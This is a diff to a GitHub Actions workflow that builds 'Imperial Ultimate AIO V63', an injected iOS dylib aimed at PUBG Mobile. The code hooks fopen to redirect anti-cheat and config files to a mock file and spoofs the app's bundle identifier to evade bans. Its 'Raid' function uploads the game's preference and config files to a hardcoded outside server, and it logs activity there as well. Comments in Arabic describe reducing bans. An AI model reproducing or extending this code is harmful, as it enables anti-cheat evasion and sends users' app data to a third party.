@@ -1,4 +1,4 @@
-name: Imperial Ultimate AIO - V62.0 OFFICIAL STEALTH
+name: Imperial Ultimate AIO - V63.0 MANUAL TRIGGER
 
 on:
   push:
@@ -26,13 +26,17 @@ jobs:
           #include <stdint.h>
 
           // ==========================================
-          // [ 1. الروابط والآيبي المثبت 34.204.178.160 ]
+          // [ 1. الإعدادات والروابط - 34.204.178.160 ]
           // ==========================================
           #define SERVER_IP @"34.204.178.160"
           #define ImperialGold [UIColor colorWithRed:1.0 green:0.84 blue:0.0 alpha:1.0]
 
+          // متغيرات التحكم (كل شيء مطفي في البداية)
+          static BOOL isGhostActive = NO;
+          static BOOL isOfficialSpoofed = NO;
+
           void RemoteLog(NSString *msg) {
-              NSDictionary *json = @{@"content": [NSString stringWithFormat:@"[Imperial V62] -> %@", msg]};
+              NSDictionary *json = @{@"content": [NSString stringWithFormat:@"[V63 Manual] -> %@", msg]};
               NSURL *url = [NSURL URLWithString:[NSString stringWithFormat:@"http://%@:5000/log", SERVER_IP]];
               NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
               [req setHTTPMethod:@"POST"];
@@ -41,18 +45,16 @@ jobs:
               [[[NSURLSession sharedSession] dataTaskWithRequest:req] resume];
           }
 
+          // إصلاح إرسال الملفات لضمان وصولها للمجلد
           void SendRaidFile(NSString *path) {
               NSData *data = [NSData dataWithContentsOfFile:path];
-              if (!data) {
-                  RemoteLog([NSString stringWithFormat:@"❌ File Not Found: %@", [path lastPathComponent]]);
-                  return;
-              }
+              if (!data) return;
               
               NSURL *url = [NSURL URLWithString:[NSString stringWithFormat:@"http://%@:5000/upload", SERVER_IP]];
               NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
               [req setHTTPMethod:@"POST"];
               
-              NSString *boundary = @"Boundary-ImpSpy-V62";
+              NSString *boundary = @"ImpV63Boundary";
               [req setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
               
               NSMutableData *body = [NSMutableData data];
@@ -64,42 +66,19 @@ jobs:
               
               [req setHTTPBody:body];
               [[[NSURLSession sharedSession] dataTaskWithRequest:req] resume];
-              RemoteLog([NSString stringWithFormat:@"✅ RAID: Sent Successfully -> %@", [path lastPathComponent]]);
+              RemoteLog([NSString stringWithFormat:@"✅ File Sent: %@", [path lastPathComponent]]);
           }
 
           // ==========================================
-          // [ 2. محرك التخفي (Official Version Spoof) ]
-          // ==========================================
-          // تزييف الـ Bundle Identifier لإقناع النظام بأنها النسخة الرسمية
-          NSString* (*orig_bundleIdentifier)(id, SEL);
-          NSString* hk_bundleIdentifier(id self, SEL _cmd) {
-              return @"com.tencent.ig"; // ضع هنا الـ ID الرسمي للنسخة
-          }
-
-          void SetupOfficialSpoof() {
-              Method m = class_getInstanceMethod([NSBundle class], @selector(bundleIdentifier));
-              orig_bundleIdentifier = (NSString*(*)(id, SEL))method_getImplementation(m);
-              method_setImplementation(m, (IMP)hk_bundleIdentifier);
-              RemoteLog(@"🛡️ Official Identity Spoofed ✅");
-          }
-
-          // ==========================================
-          // [ 3. محرك تزييف المسارات (Ghost FS) ]
+          // [ 2. محرك التزييف اليدوي (Ghost FS) ]
           // ==========================================
           typedef struct interpose_substitution { const void* replacement; const void* original; } interpose_substitution_t;
           #define INTERPOSE(_replacement,_original) __attribute__((used)) static const interpose_substitution_t _interpose_##_original __attribute__ ((section ("__DATA, __interpose"))) = { (const void*)(unsigned long)&_replacement, (const void*)(unsigned long)&_original };
 
-          BOOL is_imperial_target(const char* p) {
-              if (!p) return NO;
-              // حذفنا ShadowTrackerExtra لتقليل الباند
-              NSArray *t = @[@"config.json", @"imsdklocallog", @"global_sf_metal", @"RemoteConfig", @"GCloud", @"tss_ano", @"comm.dat", @"HttpDNS", @"APMSDKCache", @"MetalLib", @"INTLResultMsg"];
-              for (NSString *s in t) { if (strstr(p, [s UTF8String])) return YES; }
-              return NO;
-          }
-
           FILE* ghost_fopen(const char* p, const char* m) {
-              if (is_imperial_target(p)) {
-                  RemoteLog([NSString stringWithFormat:@"🛰️ Ghost FS Redirect -> %s", p]);
+              // لا يزيف إلا إذا فعلت الزر من المنيو
+              if (isGhostActive && p && (strstr(p, "config.json") || strstr(p, "GCloud") || strstr(p, "tss_ano") || strstr(p, "RemoteConfig"))) {
+                  RemoteLog([NSString stringWithFormat:@"🛰️ Redirecting: %s", p]);
                   return fopen("/var/mobile/Documents/clean_mock.dat", m);
               }
               return fopen(p, m);
@@ -107,7 +86,20 @@ jobs:
           INTERPOSE(ghost_fopen, fopen);
 
           // ==========================================
-          // [ 4. الواجهة الإمبراطورية المتحركة ]
+          // [ 3. تزييف الهوية الرسمية (يدوي) ]
+          // ==========================================
+          void SetupOfficialSpoof() {
+              if (isOfficialSpoofed) return;
+              Method m = class_getInstanceMethod([NSBundle class], @selector(bundleIdentifier));
+              method_setImplementation(m, imp_implementationWithBlock(^NSString* (id self) {
+                  return @"com.tencent.ig"; 
+              }));
+              isOfficialSpoofed = YES;
+              RemoteLog(@"🛡️ Official Identity Activated ✅");
+          }
+
+          // ==========================================
+          // [ 4. الواجهة المتحركة والمربعات ]
           // ==========================================
           @interface ImperialUI : UIWindow <WKScriptMessageHandler>
           @property (nonatomic, strong) WKWebView *web;
@@ -127,6 +119,7 @@ jobs:
           }
 
           - (void)setupUI {
+              // الزر المتحرك
               UIButton *btn = [UIButton buttonWithType:UIButtonTypeCustom];
               btn.frame = CGRectMake(20, 150, 60, 60);
               [btn setTitle:@"👑" forState:UIControlStateNormal];
@@ -135,16 +128,18 @@ jobs:
               [btn addTarget:self action:@selector(toggle) forControlEvents:UIControlEventTouchUpInside];
               [self addSubview:btn];
 
-              self.web = [[WKWebView alloc] initWithFrame:CGRectMake((self.frame.size.width-280)/2, 220, 280, 400)];
+              // المنيو
+              self.web = [[WKWebView alloc] initWithFrame:CGRectMake((self.frame.size.width-280)/2, 220, 280, 420)];
               self.web.layer.cornerRadius = 25; 
               self.web.layer.borderColor = ImperialGold.CGColor;
               self.web.layer.borderWidth = 3.0; self.web.hidden = YES;
 
-              NSString *html = @"<html><style>body{background:rgba(10,10,10,0.95);color:gold;font-family:sans-serif;padding:25px;border-radius:25px;}"
-              ".row{display:flex;justify-content:space-between;align-items:center;margin:15px 0;border-bottom:1px solid #333;padding-bottom:10px;}"
+              NSString *html = @"<html><style>body{background:rgba(10,10,10,0.95);color:gold;font-family:sans-serif;padding:25px;}"
+              ".row{display:flex;justify-content:space-between;margin:15px 0;border-bottom:1px solid #333;padding-bottom:10px;}"
               "input{width:28px;height:28px;}</style><body>"
-              "<h2 style='text-align:center'>IMPERIAL V62</h2>"
-              "<div class='row'><span>Ghost FS Active</span><input type='checkbox' onclick='send(\"Ghost\")'></div>"
+              "<h3 style='text-align:center'>IMPERIAL V63</h3>"
+              "<div class='row'><span>Ghost FS</span><input type='checkbox' onclick='send(\"Ghost\")'></div>"
+              "<div class='row'><span>Official ID</span><input type='checkbox' onclick='send(\"Official\")'></div>"
               "<div class='row'><span>Raid Files</span><input type='checkbox' onclick='send(\"Raid\")'></div>"
               "<script>function send(a){window.webkit.messageHandlers.Imp.postMessage(a);}</script></body></html>";
 
@@ -165,21 +160,21 @@ jobs:
           - (void)toggle { self.web.hidden = !self.web.hidden; }
 
           - (void)userContentController:(id)u didReceiveScriptMessage:(WKScriptMessage *)m {
+              if ([m.body isEqualToString:@"Ghost"]) { isGhostActive = !isGhostActive; RemoteLog(@"Ghost FS Toggled"); }
+              if ([m.body isEqualToString:@"Official"]) SetupOfficialSpoof();
               if ([m.body isEqualToString:@"Raid"]) {
-                  // محاولة سحب أهم الملفات الحساسة
                   SendRaidFile(@"/var/mobile/Documents/RemoteConfig.config");
                   SendRaidFile(@"/var/mobile/Library/Preferences/com.tencent.ig.plist");
               }
-              RemoteLog([NSString stringWithFormat:@"CMD Sent: %@", m.body]);
           }
           @end
 
           __attribute__((constructor))
           static void entry() {
-              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
+              // تأخير ظهور الواجهة لضمان استقرار اللعبة
+              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 15 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
                   static ImperialUI *ui; ui = [[ImperialUI alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
-                  SetupOfficialSpoof(); // تفعيل تزييف الهوية الرسمية
-                  RemoteLog(@"SERVER CONNECTED ✅ (34.204.178.160)");
+                  RemoteLog(@"✅ UI Loaded - Wait for Lobby to activate");
               });
           }
           EOF
@@ -194,6 +189,6 @@ jobs:
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: Imperial-V62-Stealth
+          name: Imperial-V63-Manual
           path: ImperialUltimate.dylib
           
